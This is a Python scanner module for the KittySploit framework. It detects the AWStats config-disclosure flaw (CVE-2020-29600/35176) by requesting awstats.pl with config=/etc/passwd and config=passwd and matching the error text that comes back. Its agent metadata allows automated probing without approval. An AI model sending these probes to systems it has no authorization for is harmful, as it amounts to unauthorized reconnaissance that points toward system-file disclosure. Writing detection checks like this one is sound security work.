#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AWStats config file disclosure (CVE-2020-29600 / CVE-2020-35176)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AWStats - Config File Disclosure Detection (CVE-2020-29600/35176)',
        'description': (
            'Detects AWStats file/config disclosure by requesting '
            'awstats.pl?config=/etc/passwd and awstats.pl?config=passwd and looking for '
            'AWStats syntax-error warnings that echo the path (CVE-2020-29600 / CVE-2020-35176).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'awstats', 'lfi', 'info-disclosure', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.8,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2020-29600',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-35176',
        ],
        'cve': ['CVE-2020-29600', 'CVE-2020-35176'],
    }

    base_path = OptString('', 'Optional AWStats base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        prefix = self._prefix()
        checks = (
            (f'{prefix}/awstats.pl?config=/etc/passwd', ('/etc/passwd', 'Warning: Syntax error line')),
            (f'{prefix}/awstats.pl?config=passwd', ('passwd', 'Warning: Syntax error line', 'Config line is ignored.')),
        )
        for path, markers in checks:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if all(m in body for m in markers):
                self.set_info(
                    severity='medium',
                    reason='AWStats config disclosure via config= parameter',
                    path=path,
                )
                return True
        return False
